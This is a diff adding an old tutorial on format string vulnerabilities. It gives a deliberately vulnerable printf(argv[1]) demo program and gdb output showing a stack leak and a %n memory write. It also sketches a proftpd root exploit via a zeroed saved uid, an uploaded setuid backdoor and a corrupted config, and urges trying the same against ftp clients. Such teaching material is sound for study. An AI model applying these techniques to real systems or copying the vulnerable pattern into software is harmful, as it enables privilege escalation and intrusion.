@@ -1,0 +1,187 @@
+        Format Bugs: What are they, Where did they come from,......
+                    ...How to exploit them
+                    
+                    by lamagra <lamagra@digibel.org>
+                    
+-------> What are they
+
+The concept is quite simple: when a *printf() function (eg. printf(char *fmt,...))
+is called and fmt is user-supplied. The user can put in formatstrings %s %p %x
+in the fmt. *printf will then "convert" them with the supplied arguments.
+Problem is *printf() doesn't know where it's arguments stop. When a new 
+formatstrings it just reads the next thing on the stack. Lets have a look
+at an example.
+
+<++> ptest.c
+#include <stdarg.h>
+
+blaat(char *fmt,...)
+{
+    va_list va;
+    int i;
+    char *addr;
+    
+    va_start(va,fmt);
+
+    printf("---| begin |---\n");    
+    for(i = 0;i < 5;i++)
+    {
+        addr = va_arg(va,char *);
+        printf("%p\n",addr);
+    }
+    printf("---|  end  |---\n");
+    
+    va_end(va);
+}
+
+main(int argc,char **argv)
+{  
+    char buf[8];
+    char *prot = (char *)0x12345678;
+    
+    strncpy(buf,argv[1],8);
+    
+    blaat(argv[1]);
+    printf(argv[1]);
+    putchar('\n');
+}
+<-->
+
+darkstar:/tmp/temp# gcc ptest.c -optest
+darkstar:/tmp/temp# ptest blaat
+---| begin |---
+0x12345678
+0x61616c62
+0xbfff0074
+0xbffffb24
+0x804855e
+---|  end  |---
+blaat
+
+A simple argument makes it print the 5 things on the top of the stack before the
+call to blaat(). You can see 0x12345678 which is the content of 'prot' and the
+content of buf namely our argument. The output of printf() is just our argument.
+Now lets run it again with some formatstrings in the argument, I use %p since it
+doesn't crash the program.
+
+darkstar:/tmp/temp# ptest AAAA%p
+---| begin |---
+0x12345678
+0x41414141
+0xbf007025
+0xbffffb24
+0x804855e
+---|  end  |---
+AAAA0x12345678
+
+Now the output of printf() is quite interesting. It prints 4 times 'A' and the
+%p is replaced by the address on top of the stack. When you'd add more %p's to
+the argument you'll see every other element on the stack gets printed.
+
+------> How to exploit them?
+
+First thing to do is, check out the other kinds of formatstrings:
+%c, %f, %d, %s, %p, %i, %n, etc
+
+%n is probably the most interesting, it writes the number of bytes printed to
+the location pointed to by it's argument.
+
+simple example:
+int q;
+printf("AAAA%n",&q);
+q = 4 after that
+
+As we've seen from our previous tests, our argument copied into buf, is on the 
+stack aswell. What if we replaced the AAAA with a valid address and then wrote
+to that address using %n. Lets see
+darkstar:/tmp/temp# gdb --exec=a.out --symbols=ptest
+GNU gdb 4.17
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i586-slackware-linux"...
+(gdb) r
+Starting program: /tmp/temp/a.out
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+Cannot remove breakpoints because program is no longer writable.
+It might be running in another process.
+Further execution is probably impossible.
+0x8048090 in ___crt_dummy__ ()
+(gdb) break *main+60
+Breakpoint 1 at 0x804821c: file ptest.c, line 30.
+(gdb) break *main+65
+Breakpoint 2 at 0x8048221: file ptest.c, line 30.
+(gdb) c
+Continuing.
+---| begin |---
+0x12345678
+0xbffffb10
+0x6e257025
+0xbffffb00
+0x80480ee
+---|  end  |---
+
+Breakpoint 1, 0x804821c in main (argc=2, argv=0xbffffba0) at ptest.c:30
+30          printf(argv[1]);
+(gdb) x/wx 0xbffffb10
+0xbffffb10:     0x00000000
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x8048221 in main (argc=2, argv=0xbffffba0) at ptest.c:30
+30          printf(argv[1]);
+(gdb) x/wx 0xbffffb10
+0xbffffb10:     0x0000000e
+(gdb) c
+Continuing.
+û ¿0x12345678
+
+Program exited with code 012.
+(gdb) q
+darkstar:/tmp/temp#
+
+a.out is a simple program that executes ptest with \x10\xfb\xff\xbf%p%n as 
+argument, as you can see %p prints the first address and %n writes to 0xbfffb10.
+Pretty neat eh, I think it is.
+
+What can I do with this, you ask. Well you can overwrite anything inside the 
+program (except regions mapped PROT_WRITE like .text). This can be many things
+In my proftpd exploit I chose for the saved uid and part of the configs in mem.
+The daemon relinquishes rootpriviledges for opening a dataconnection 
+(on LIST,RETR,etc) after that it changes back to the old uid (saved in mem).
+The general idea was to zero that uid, open a dataconnection and up with root
+priviledges inside proftpd. With local access this is enough, you upload a backdoor
+and CHMOD 4755 (-rwsr-xr-x) proftp allows suidsgid flags unlike wuftpd. 
+But with anonymous access, you couldn't write to disk because of the configuration.
+Simple thing to do is, corrupt the configuration. In this case corrupt the 'DenyAll'
+setting.
+Other things to do are eg. change the last byte of a stackpointer, data in memory.
+and lots more.
+
+An interesting thing in the new glibc version is that for example %<long number>d
+works even with snprintf(), on older glibc's it just crashes. 
+
+*- note -*
+"%.5d",5 outputs 00005
+"%.200000d" outputs 200000 bytes
+*- note -*
+
+With this advantage you could also change <saved %eip>, function pointers,
+jmp_buf's etc etc
+
+All this is very nice, but it can get really hard sometimes. Some sort of
+userdefined string has to be somewhere on the stack when the function is called.
+This requires some fiddling and some stackbacktracing. Sometimes you have to go
+back a few functions before a buffer is in reach. 
+Conclusion: these bugs are big, sometimes....
+
+This concludes this small introduction into format bugs. If you want to play
+some more with this kind of bugs, fiddle a bit with the ptest program. 
+And maybe try exploiting the ftp program on bsd, linux, windows... it has this
+sort of hole in the QUOTE command. This isn't a big thing but nice to play with.
+
+------> The end 
+http://lamagra.seKure.de
